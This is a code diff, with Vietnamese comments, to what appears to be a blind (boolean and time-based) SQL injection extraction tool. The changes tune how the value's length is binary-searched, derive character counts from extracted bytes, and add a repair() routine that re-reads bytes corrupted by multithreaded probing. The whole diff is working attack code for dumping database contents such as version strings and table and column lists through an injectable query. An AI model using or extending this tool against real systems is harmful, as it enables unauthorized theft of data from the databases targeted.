@@ -75,8 +75,14 @@ def bsearch(oracle: Oracle, expr: str, lo: int, hi: int) -> int:
     return lo
 
 
-def get_number(oracle: Oracle, expr: str, hi: int = 4096) -> int:
-    """Đọc một số nguyên, tự nới rộng khoảng trên nếu cần."""
+def get_number(oracle: Oracle, expr: str, hi: int = 1024) -> int:
+    """Đọc một số nguyên, tự nới rộng khoảng trên nếu cần.
+
+    hi mặc định 1024: cân bằng cho tool tổng quát - cover cả giá trị dump dài (version
+    string, danh sách bảng/cột nối chuỗi) mà hiếm khi phải nới rộng, nhưng vẫn nhỏ hơn
+    4096 nhiều (tiết kiệm ~2 câu hỏi/lần đo, mỗi câu có thể tốn `delay` giây). Vẫn tự gấp
+    đôi khoảng nếu giá trị thực dài hơn -> không giới hạn cứng.
+    """
     while not oracle.ask("%s between 0 and %d" % (expr, hi)):
         hi *= 2
         if hi > 2 ** 24:
@@ -156,21 +162,20 @@ def extract(oracle: Oracle,
             log(msg)
 
     # 1) subquery có dữ liệu không? NULL làm mọi điều kiện thành false âm thầm.
-    _log("[extract] bước 1: kiểm tra subquery có dữ liệu (IS NOT NULL)...")
+    _log("[extract] kiểm tra subquery có dữ liệu (IS NOT NULL)...")
     if not oracle.ask(dia.notnull(query)):
         raise ExtractError(
             "subquery trả NULL hoặc không có row. Kiểm tra tên bảng/cột và quyền."
         )
 
-    # 2) độ dài byte và ký tự -> phát hiện multibyte
-    _log("[extract] bước 2: đo độ dài bằng binary search (length / char_length)...")
+    # 2) độ dài. Ở chế độ HEX ta đọc theo BYTE (blen*2 hex-digit) -> chỉ cần length().
+    #    char_length() KHÔNG cần cho việc đọc (chỉ để phát hiện multibyte) -> tính SAU
+    #    khi đã có bytes (decode + đếm ký tự), MIỄN PHÍ, thay vì binary search riêng.
+    #    Ở chế độ CHAR mới cần đo char_length() để biết số ký tự phải đọc.
+    _log("[extract] Đo độ dài bằng binary search (length)...")
     blen = get_number(oracle, dia.length(query))
-    clen = get_number(oracle, dia.charlen(query))
     meta["byte_len"] = blen
-    meta["char_len"] = clen
-    multibyte = "  <-- KHÁC NHAU: có ký tự multibyte" if blen != clen else ""
-    _log("[extract]   length()      = %d byte" % blen)
-    _log("[extract]   char_length() = %d ký tự%s" % (clen, multibyte))
+    _log("[extract]   length() = %d byte" % blen)
 
     thread_note = ("%d luồng song song" % threads) if threads > 1 else "tuần tự (1 luồng)"
 
@@ -189,14 +194,25 @@ def extract(oracle: Oracle,
         digits_list = _run_positions(
             n, lambda i: _read_hex_digit(oracle, dia, src, i), threads, _on_done)
         digits = "".join(digits_list)
+        raw = bytes.fromhex(digits)
+        # char_len suy ra MIỄN PHÍ từ bytes (không tốn request): số ký tự UTF-8.
+        meta["char_len"] = len(raw.decode("utf-8", "replace"))
         # preview cuối (khi song song không có preview lũy tiến theo thứ tự)
-        _progress(blen, blen, bytes.fromhex(digits).decode("utf-8", "replace"))
-        return bytes.fromhex(digits), meta
+        _progress(blen, blen, raw.decode("utf-8", "replace"))
+        return raw, meta
 
     if mode == "char":
-        _log("[extract] bước 3: đọc trực tiếp từng ký tự - %s ký tự, mỗi ký tự ~8 request "
-             "[%s]..." % (maxlen or clen, thread_note))
-        n = maxlen or clen
+        # Chế độ char cần số KÝ TỰ. char_length() <= length() (byte) luôn đúng ->
+        # tìm trong [0, blen] thay vì [0, 4096] để tiết kiệm câu hỏi.
+        if maxlen:
+            n = maxlen
+        else:
+            _log("[extract] đo char_length() (trong khoảng [0, %d])..." % blen)
+            clen = get_number(oracle, dia.charlen(query), hi=max(blen, 1))
+            meta["char_len"] = clen
+            n = clen
+        _log("[extract] bước 3: đọc trực tiếp từng ký tự - %d ký tự, mỗi ký tự ~8 request "
+             "[%s]..." % (n, thread_note))
 
         def _on_done_c(done):
             _progress(done, n, "")
@@ -219,3 +235,85 @@ def verify(oracle: Oracle, query: str, dialect: dict, data: bytes) -> bool:
     dia = Dialect(dialect)
     lit = dia.hexlit(data.hex())
     return oracle.ask("(%s) between %s and %s" % (query, lit, lit))
+
+
+def _byte_correct(oracle: Oracle, dia: "Dialect", src_hex: str, byte_index: int,
+                  byte_val: int) -> bool:
+    """Kiểm tra byte thứ `byte_index` (1-based) của value có bằng `byte_val` không.
+
+    So sánh 2 hex-digit của byte đó với hex mong đợi. Mỗi hex-digit là 1 câu hỏi
+    'ord(substr(hex,i,1)) between v and v'. Byte đúng <=> CẢ HAI hex-digit đúng.
+    Đây là so khớp chính xác -> đáng tin ngay cả khi threshold dao động (chỉ cần oracle
+    phân biệt được TRUE/FALSE, mà pha này chạy tuần tự nên không nhiễu đa luồng).
+    """
+    hex_pair = "%02X" % byte_val
+    pos = (byte_index - 1) * 2  # vị trí hex-digit đầu của byte (0-based)
+    for k in (0, 1):
+        want = ord(hex_pair[k])
+        expr = dia.char_code_at(src_hex, pos + k + 1)  # 1-based
+        if not oracle.ask("%s between %d and %d" % (expr, want, want)):
+            return False
+    return True
+
+
+def repair(oracle: Oracle,
+           query: str,
+           dialect: dict,
+           data: bytes,
+           log=None,
+           max_bad_ratio: float = 0.5) -> bytes:
+    """Sửa các byte đọc sai (do nhiễu đa luồng) bằng cách VERIFY + ĐỌC LẠI 1 luồng.
+
+    QUAN TRỌNG: hàm này phải chạy với một Oracle TUẦN TỰ (không đa luồng) để phép đo
+    không bị nhiễu -> verify chính xác. cli truyền oracle 1-luồng vào đây.
+
+    Cách làm (chế độ hex - luôn dùng hex để đúng cả byte >127):
+      1. Với mỗi byte i: verify 2 hex-digit của nó có khớp không. Byte sai -> ghi nhận.
+      2. Đọc lại (1 luồng) các byte sai bằng binary search.
+      3. Trả về bytes đã sửa.
+
+    Nếu tỉ lệ byte sai > max_bad_ratio -> pha nhanh quá tệ, báo lỗi (không đáng sửa từng
+    byte, nên chạy lại toàn bộ với ít luồng hơn).
+    """
+    def _log(msg):
+        if log:
+            log(msg)
+
+    dia = Dialect(dialect)
+    out = bytearray(data)
+    n = len(out)
+    if n == 0:
+        return bytes(out)
+
+    src_hex = dia.hex(query)
+
+    # 1) verify từng byte (tuần tự) -> tìm byte sai
+    bad = []
+    for i in range(1, n + 1):
+        if not _byte_correct(oracle, dia, src_hex, i, out[i - 1]):
+            bad.append(i)
+
+    if not bad:
+        _log("[repair] verify từng byte: tất cả ĐÚNG.")
+        return bytes(out)
+
+    ratio = len(bad) / n
+    _log("[repair] %d/%d byte sai (%.0f%%)." % (len(bad), n, ratio * 100))
+    if ratio > max_bad_ratio:
+        _log("[repair] quá nhiều byte sai -> pha đa luồng không đáng tin. "
+             "Nên chạy lại với --threads nhỏ hơn.")
+        # vẫn thử sửa để không mất công, nhưng cảnh báo ở trên.
+
+    # 2) đọc lại các byte sai bằng 1 luồng (đọc 2 hex-digit của mỗi byte sai)
+    _log("[repair] đọc lại %d byte sai bằng 1 luồng..." % len(bad))
+    hexchars = list(out.hex().upper())
+    for i in bad:
+        pos = (i - 1) * 2
+        hexchars[pos] = _read_hex_digit(oracle, dia, src_hex, pos + 1)
+        hexchars[pos + 1] = _read_hex_digit(oracle, dia, src_hex, pos + 2)
+    try:
+        out = bytearray(bytes.fromhex("".join(hexchars)))
+    except ValueError:
+        _log("[repair] hex sau sửa không hợp lệ - giữ nguyên bản đọc đa luồng.")
+
+    return bytes(out)
